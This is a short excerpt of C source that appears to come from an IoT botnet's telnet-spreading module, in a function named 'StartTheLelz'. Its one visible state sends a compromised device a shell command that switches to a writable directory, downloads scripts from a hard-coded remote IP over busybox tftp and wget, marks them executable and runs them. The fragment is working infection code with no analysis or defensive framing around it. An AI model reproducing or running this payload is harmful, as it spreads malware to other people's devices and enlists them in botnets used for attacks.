...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox tftp 185.112.248.68 -c get tftp.sh;busybox chmod +x tftp.sh;sh tftp.sh;busybox tftp -r tftp1.sh -g 185.112.248.68; busybox chmod +x tftp1.sh;sh tftp1.sh;wget http://185.112.248.68/gtop.sh || busybox wget http://185.112.248.68.cf/gtop.sh; chmod +x gtop.sh || busybox chmod +x gtop.sh;sh gtop.sh\r\n", 357, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
